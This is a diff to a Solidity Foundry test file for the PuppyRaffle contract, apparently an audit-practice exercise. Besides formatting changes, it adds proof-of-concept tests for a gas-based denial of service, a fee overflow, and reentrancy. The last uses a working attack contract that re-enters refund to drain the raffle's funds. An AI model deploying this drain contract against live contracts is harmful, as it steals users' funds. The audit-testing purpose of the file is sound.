@@ -16,11 +16,7 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -170,7 +166,7 @@ contract PuppyRaffleTest is Test {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
 
-        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);
+        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);
 
         puppyRaffle.selectWinner();
         assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
@@ -188,8 +184,8 @@ contract PuppyRaffleTest is Test {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
 
-        string memory expectedTokenUri =
-            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
+        string
+            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
 
         puppyRaffle.selectWinner();
         assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
@@ -212,5 +208,124 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    ////////////////////////////////////////
+    ////////// My PErsonal Written Test ////
+    ///////////////////////////////////////
+
+    function test_breakingforDosc() external {
+        vm.txGasPrice(1);
+        //Forst 100 Batch
+        uint256 playerNum = 100;
+        address[] memory players = new address[](playerNum);
+        for (uint256 i = 0; i < playerNum; i++) {
+            players[i] = address(i);
+        }
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(players);
+        uint256 gasEnd = gasleft();
+        uint256 gasUsedFirst = gasStart - gasEnd;
+        console.log("gasUsed", gasUsedFirst);
+
+        //Sencond 100 Batch
+
+        address[] memory playersSecond = new address[](playerNum);
+        for (uint256 i = 0; i < playerNum; i++) {
+            playersSecond[i] = address(i + playerNum);
+        }
+        uint256 gasStartSecond = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(playersSecond);
+        uint256 gasEndSecond = gasleft();
+        uint256 gasUsedSecond = gasStartSecond - gasEndSecond;
+        console.log("gasUsed", gasUsedSecond);
+        assert(gasUsedFirst < gasUsedSecond);
+    }
+
+    function test_Rentrancy_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        ReentranctyAttackContract attackerContract = new ReentranctyAttackContract(
+                puppyRaffle
+            );
+        address attackerUser = makeAddr("attackerUser");
+        vm.deal(attackerUser, 1e18);
+
+        uint256 startingAttackerContractBalance = address(attackerContract)
+            .balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackerUser);
+        attackerContract.attack{value: entranceFee}();
+        console.log(
+            "attacker Contract Balance",
+            startingAttackerContractBalance
+        );
+        console.log("starting contract balance", startingContractBalance);
+        console.log(
+            "ending attcker balance",
+            address(attackerContract).balance
+        );
+        console.log("ending contract balance", address(puppyRaffle).balance);
+    }
+
+    function test_overflow() external playersEntered {
+        //PuppyRaffle puppyRaffel;
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFee = puppyRaffle.totalFees();
+        //2nd phase
+        uint256 playerNum = 89;
+        address[] memory players = new address[](playerNum);
+        for (uint256 i = 0; i < playerNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(players);
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 endingTotalFee = puppyRaffle.totalFees();
+        assert(endingTotalFee < startingTotalFee);
+        //vm.prank(puppyRaffle.feeAddress());
+       // vm.expectRevert("PuppyRaffle: There are some active players");
+       // puppyRaffle.withdrawFees();
+    }
+}
+
+contract ReentranctyAttackContract {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackeIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackeIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackeIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackeIndex);
+        }
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+    fallback() external payable {
+        _stealMoney();
     }
 }
